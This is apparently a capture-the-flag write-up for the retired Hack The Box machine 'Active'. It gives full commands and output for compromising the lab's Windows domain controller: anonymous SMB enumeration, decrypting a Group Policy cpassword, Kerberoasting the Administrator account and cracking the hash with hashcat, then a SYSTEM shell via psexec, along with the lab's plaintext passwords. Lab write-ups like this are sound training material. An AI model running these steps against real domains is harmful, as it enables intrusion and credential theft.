# Active

This is the write-up for the box Active that got retired at the 8th December 2018.
My IP address was 10.10.14.16 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.100    active.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/active.nmap 10.10.10.100
```

```markdown
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-16 08:49:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

These services can often be found on an **Active Directory** domain controller.

## Checking DNS (Port 53)

The hostname of the box could be interesting information:
```markdown
nslookup

server 10.10.10.100
Default server: 10.10.10.100
Address: 10.10.10.100#53

127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.

10.10.10.100
server can't find 100.10.10.10.in-addr.arpa: SERVFAIL
```

Unfortunately it does not give any information about the hostname.

## Checking SMB (Port 445)

It is possible to get the shares of SMB without authentication by using an anonymous authentication:
```markdown
smbclient -L //10.10.10.100
```

After pressing enter without entering a password, it displays the SMB shares:
```markdown
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk      
SYSVOL          Disk      Logon server share
Users           Disk
```

The tool **SMBmap** can also enumerate the permissions without authentication:
```markdown
smbmap -H 10.10.10.100
```
```markdown
Disk             Permissions     Comment
----             -----------     -------
ADMIN$           NO ACCESS       Remote Admin
C$               NO ACCESS       Default share
IPC$             NO ACCESS       Remote IPC
NETLOGON         NO ACCESS       Logon server share
Replication      READ ONLY
SYSVOL           NO ACCESS       Logon server share
Users            NO ACCESS
```

The share _Replication_ has a read-only access, so this should be investigated.
Displaying the contents of the share recursively:
```markdown
smbmap -H 10.10.10.100 -R Replication
```

There is a file called _Groups.xml_ in the directory _"\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\"_, which is a **Group Policy file** where local account information is stored.
```markdown
smbclient //10.10.10.100/Replication

smb: \> get \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

Contents of _Groups.xml_:
```markdown
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The username is _active.htb\SVC_TGS_ and the password is encrypted, but can be decrypted with **gpp-decrypt**:
```markdown
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

It shows that the decrpyted password is:
> GPPstillStandingStrong2k18

### Enumerating SMB with Authentication

Lets see which shares can be accessed with this user:
```markdown
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
```
```markdown
Disk             Permissions     Comment
----             -----------     -------
ADMIN$           NO ACCESS       Remote Admin
C$               NO ACCESS       Default share
IPC$             NO ACCESS       Remote IPC
NETLOGON         READ ONLY       Logon server share
Replication      READ ONLY
SYSVOL           READ ONLY       Logon server share
Users            READ ONLY
```

The only interesting thing is _user.txt_ in the _Users_ share.

## Privilege Escalation

With the valid user in the domain, we can look for interesting information in the domain.
The scripts from the [Impacket Framework](https://github.com/SecureAuthCorp/impacket) will be helpful to do this.

For example getting user information on the box:
```markdown
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
```
```markdown
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40.351723  2018-07-30 19:17:40.656520
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 20:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 22:14:38.402764  2018-07-21 16:01:30.320277
```

To get a foothold of the domain, the tool **Bloodhound** can map the connections between users and their permissions.
As the ingestor binary _Sharphound.exe_ from Bloodhound has to be run on the box, we need to connect to the domain via a Windows client:
```markdown
runas /netonly /user:active.htb\svc_tgs cmd
```

This starts a command shell as the user and allows us to run _Sharphound.exe_ on the domain:
```markdown
.\Sharphound.exe -c all -d active.htb --DomainController 10.10.10.100
```

> NOTE: Configure the DNS server on the interface to 10.10.10.100 or the connection will not work

After it finishes, it creates a _.zip_ file that can be drag&dropped into **Bloodhound** for further analysis.

When using the query called _"Shortest Path from Kerberoastable Users"_ it shows that the user _Administrator[@]active.htb_ is vulnerable to a **Kerberoast attack** which can be done with another script from the **Impacket Framework**:
```markdown
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

This outputs the ticket hash for _Administrator_:
```markdown
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445\*$98484(...)
```

Now it has to be cracked and therefore I will use **Hashcat**:
```markdown
hashcat -m 13100 active.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password for _Administrator_ is:
> Ticketmaster1968

These credentials can now be used with _psexec_ to start a session on the box as _NT Authority\SYSTEM_!
```markdown
psexec.py active.htb/Administrator@10.10.10.100
```
